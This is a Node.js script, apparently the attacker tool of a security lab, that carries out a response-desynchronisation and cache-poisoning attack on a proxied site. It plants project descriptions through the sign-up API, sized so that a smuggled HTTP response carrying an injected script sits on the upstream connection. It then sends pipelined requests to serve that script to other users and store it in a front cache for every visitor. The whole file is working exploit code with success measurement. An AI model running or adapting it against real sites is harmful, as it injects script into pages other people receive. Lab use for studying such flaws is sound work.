// What the attacker does. It uses the sign-up API and the public site, nothing else.
//   node tools/attacker.mjs signup            two accounts with one project each; the store accepts all of it
//   node tools/attacker.mjs fit               after a build: read both pages from outside, then size the two descriptions
//   node tools/attacker.mjs check             after the next build: is the pair in place? Prints the URL to request.
//   node tools/attacker.mjs shots [n] [k]     how often one attempt lands, with nobody else on the proxy
//   node tools/attacker.mjs poison [path...]  with a cache in front: put the script in it, for every visitor
// CHAIN=n puts n responses after byte SIZE instead of one. SERIAL=1 gives the two requests of an
// attempt a connection each, instead of one segment. TRIES=n caps the attempts per URL.
import {
  CHAIN,
  PAGES,
  RESPONSE,
  SCRIPT,
  SIZE,
  STORE,
  get,
  pair,
  paths,
  pathOf,
  pipeline,
  uncached,
} from './lab.mjs';

// Before `fit`, each project has a description of 64 letters, to tell the two pages apart from outside.
const LETTERS = ['a'.repeat(64), 'b'.repeat(64)];

// A description stands in the page twice: once as text, once in the transfer state as JSON. So a
// double quote costs 3 bytes and a line break costs 3, where a letter costs 2.
const cost = (text) => text.length + JSON.stringify(text).length - 2;

async function store(method, path, body, ignore) {
  const response = await fetch(`${STORE}/${path}`, {
    method,
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body),
  });
  const text = await response.text();
  console.log(`${method} /${path}`.padEnd(38), response.status, text.length > 90 ? `${text.length} bytes` : text);
  if (!response.ok && !(ignore && text.includes(ignore))) process.exit(1);
}

const describe = (page, description) =>
  store('PUT', `projects/${page.user}/${page.name}`, { description });

// What the store holds now, which is what the build that is up was made from. Reading it back is what
// lets `fit` run on its own output, so a new SIZE costs one build and not two.
const held = (page) =>
  fetch(`${STORE}/projects/${page.user}/${page.name}`)
    .then((response) => response.json())
    .then((project) => project.description);

// The store keeps its records in memory, so a restart of it leaves the site standing and the attacker
// gone. Running this again is how that is repaired: a name that is already there is not a failure,
// and the description of a record that survived is left as it is.
async function signup() {
  for (const { user } of PAGES.toReversed()) {
    const record = { name: user, bio: 'Tools.', website: 'https://mallory.example.test/' };
    await store('POST', 'users', record, 'name is taken');
  }
  for (const [i, page] of PAGES.entries()) {
    await store('POST', 'projects', { ...page, description: LETTERS[i] }, 'name is taken');
  }
}

async function fit() {
  const texts = await Promise.all(PAGES.map(held));
  if (texts.some((text) => typeof text !== 'string')) {
    throw new Error('the attacker has no records in the store, which keeps them in memory: run signup');
  }
  // The first bytes of a description, not all of it: a proxy in front cuts the lost page's body at
  // the length it declares, and after one `fit` the descriptions are longer than that.
  const mark = (text) => text.slice(0, 64);
  const seen = await Promise.all(PAGES.map((page) => get(pathOf(page))));
  const shows = seen.map((response) => texts.findIndex((text) => response.body.includes(mark(text))));
  if (shows.includes(-1)) throw new Error('the two pages are not in this build');

  // When both URLs show the same description, that page stayed and the other one was lost. The lost
  // page still has its own Content-Length, which is the only thing the attacker needs from it.
  const shared = shows[0] === shows[1];
  const stays = shared ? shows[0] : 1;
  const lost = 1 - stays;
  console.log(
    shared
      ? `${pathOf(PAGES[lost])} serves the page of ${pathOf(PAGES[stays])}: one chunk for both`
      : 'each URL serves its own page: no shared chunk',
  );

  // The lost page is declared with SIZE bytes. One double quote fixes the parity.
  const empty = seen[lost].declared - cost(texts[lost]);
  const odd = (SIZE - empty) % 2;
  await describe(PAGES[lost], 'x'.repeat((SIZE - empty - 3 * odd) / 2) + '"'.repeat(odd));

  // The page that stays is filled with copies of the response, so that one of them begins exactly at
  // byte SIZE and CHAIN of them stand complete after it. The remainder is 'y', before the first copy.
  const offset = seen[stays].body.indexOf(mark(texts[stays]));
  const gap = SIZE - offset;
  const copies = Math.floor(gap / RESPONSE.length) + CHAIN;
  await describe(PAGES[stays], 'y'.repeat(gap % RESPONSE.length) + RESPONSE.repeat(copies));
  console.log(`${pathOf(PAGES[stays])} is to carry ${CHAIN} response(s) from byte ${SIZE} on`);
}

async function check() {
  const { seen, lost, read } = await pair();
  const after = seen[1 - Math.max(lost, 0)]?.body.subarray(SIZE).toString('latin1') ?? '';
  for (const [i, response] of seen.entries()) {
    console.log(`GET ${pathOf(PAGES[i]).padEnd(20)} ${response.status}  Content-Length ${response.declared}`);
  }
  console.log(
    `from byte ${SIZE}: ${JSON.stringify(after.slice(0, 48))}  ` +
      `${after.split(RESPONSE).length - 1} complete response(s)`,
  );
  if (!read || !after.startsWith('HTTP/1.1 200 OK\n')) {
    console.log('not in place');
    process.exit(1);
  }
  console.log(`in place: request ${read}`);
}

// One attempt, the two requests in one segment: the short page, which leaves the rest of the other
// page on the upstream connection the proxy takes back, and then a page of the site, which that
// waiting response answers. The k requests after the read show how far one poisoned connection
// reaches. SERIAL=1 gives each request a connection of its own, which is what the handshake between
// the two costs the attacker.
async function attempt(read, target, k) {
  const asked = [uncached(read), ...Array.from({ length: k }, () => uncached(target))];
  if (!process.env.SERIAL) return (await pipeline(asked)).slice(1);
  const seen = [];
  for (const path of asked) seen.push(await get(path));
  return seen.slice(1);
}

// Nothing else is on the proxy here, so what this counts is the attempt itself: whether the rest of
// the page arrives after the proxy has given the connection away, and not while it sits idle in the
// pool, where the proxy sees it and closes it. The target carries a query of its own, so a cache in
// front cannot answer it and every attempt is measured, not the cache.
async function shots() {
  const [n, k] = [Number(process.argv[3] ?? 100), Number(process.argv[4] ?? 1)];
  const { read } = await pair();
  if (!read) throw new Error('the pair is not in this build: run fit, build again, then check');
  const target = process.env.TARGET ?? '/alice/notes';
  const at = Array.from({ length: k }, () => 0);

  for (let i = 0; i < n; i++) {
    const seen = await attempt(read, target, k);
    seen.forEach((response, j) => {
      if (response.body.includes(SCRIPT)) at[j] += 1;
    });
  }
  const landed = at.reduce((a, b) => a + b, 0);
  console.log(
    `${n} attempts on ${target}, ${k} request(s) each, ` +
      `${process.env.SERIAL ? 'a connection each' : 'one segment'}, CHAIN ${CHAIN}, SIZE ${SIZE}`,
  );
  console.log(`  landed       ${landed} of ${n * k}  (${((100 * landed) / (n * k)).toFixed(1)} %)`);
  console.log(`  by position  ${at.join(' ')}`);
  console.log(`\nSHOTS ${JSON.stringify({ n, k, landed, at })}`);
}

// A cache in front keeps what it is given. One attempt that lands while the cache holds no copy of
// the URL is stored under it, and from then on every visitor is served the script from the cache,
// with no attacker traffic at all. An attempt that does not land stores the real bytes instead, so
// there is one attempt per URL per `proxy_cache_valid` period. Without a cache there are as many
// attempts as the attacker likes, and each one reaches whoever the proxy serves next.
async function poison() {
  const targets = process.argv.length > 3 ? process.argv.slice(3) : await paths();
  const { read } = await pair();
  if (!read) throw new Error('the pair is not in this build: run fit, build again, then check');
  const limit = Number(process.env.TRIES ?? 400);

  for (const target of targets) {
    let tries = 1;
    for (; tries <= limit; tries++) {
      // The target keeps its own URL here: it is the key the cache stores the answer under.
      const answer = process.env.SERIAL
        ? await get(uncached(read)).then(() => get(target))
        : (await pipeline([uncached(read), target]))[1];
      if (answer.body.includes(SCRIPT) || answer.cache === 'HIT') break;
    }
    const stored = await get(target);
    console.log(
      `${target.padEnd(30)} ${String(tries).padStart(4)} attempts  X-Cache ${stored.cache.padEnd(7)} ` +
        `${stored.type.padEnd(26)} ${stored.body.includes(SCRIPT) ? 'the script' : 'its own bytes'}`,
    );
  }
}

await { signup, fit, check, shots, poison }[process.argv[2] ?? 'check']();
